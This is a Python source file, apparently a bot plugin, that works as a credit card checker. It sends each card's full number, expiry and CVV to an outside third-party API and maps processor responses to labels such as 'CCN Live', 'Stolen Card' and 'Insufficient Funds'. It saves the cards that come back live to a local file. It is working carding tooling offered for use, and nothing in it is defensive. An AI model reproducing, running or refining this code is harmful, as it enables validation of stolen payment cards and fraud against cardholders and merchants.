import requests
import random
from plugins.func.users_sql import *
session = requests.session()
def charge_func(r,cc,cvv,mes,ano,):
  try:
    # ft = open('pi.txt').read().splitlines()
    # myline =random.choice(ft)
    # print(myline)
    # client_secret = myline
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"
    # chk_cc = f"{cc}|{mes}|{ano}|{cvv}|{client_secret}"
    authurl = f"""https://www.mainulhasanbd.tk/prvbotchk/api.php?lista={fullcc}"""
    reqone = session.get(authurl)
    result = reqone.text
    if "success" in result:
      response = "Payment Successfull ✅"
      saved = f"""
CC: {cc}|{mes}|{ano}|{cvv}
Result - {response}
  
      """
      with open("plugins/cc.txt", "a") as f:
        f.write(f"{saved}")
      # with open("pi.txt","r+") as f:
      #   new_f = f.readlines()
      #   f.seek(0)
      #   for line in new_f:
      #     if client_secret not in line:
      #       f.write(line)
      #   f.truncate()
    elif "insufficient_funds" in result or "card has insufficient funds." in result:
      response = "Insufficient Funds ❎"
    elif "incorrect_cvc" in result or "security code is incorrect." in result or "Your card's security code is incorrect." in result:
      response = "CCN Live ❎"
    elif "transaction_not_allowed" in result:
      response = "Card Doesn't Support Purchase ❎"
    elif "do_not_honor" in result:
      response = "Do Not Honor 🚫"
    elif "stolen_card" in result:
      response = "Stolen Card 🚫"
    elif "lost_card" in result:
      response = "Lost Card 🚫"
    elif "pickup_card" in result:
      response = "Pickup Card 🚫"
    elif "incorrect_number" in result:
      response = "Incorrect Card Number 🚫"
    elif "expired_card" in result:
      response = "Expired Card 🚫"
    elif "Your card was declined." in result or "card was declined" in result:
      response = "Generic Decline 🚫"
    elif "fraudulent" in result:
      response = "Fraudulent 🚫"
    elif "lock_timeout" in result:
      response = "Api Error 🚫"
    elif "Your card was declined." in result:
      response = "Generic Decline 🚫"
    elif "intent_confirmation_challenge" in result:
      response = "Captcha 😥"
    elif "stripe_3ds2_fingerprint" in result:
      response = "3D Secured ❎"
    elif "Your card does not support this type of purchase." in result:
      response = "Locked Card 🚫"
    elif "parameter_invalid_empty" in result:
      response = "404 error 🚫"
    elif "invalid_request_error" in result:
      response = "404 error 🚫"
  
    else:
      response = "Proxy Error 🚫"
  
    return (f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Result - {response}</b>\n")
  except Exception as e:
      print(e)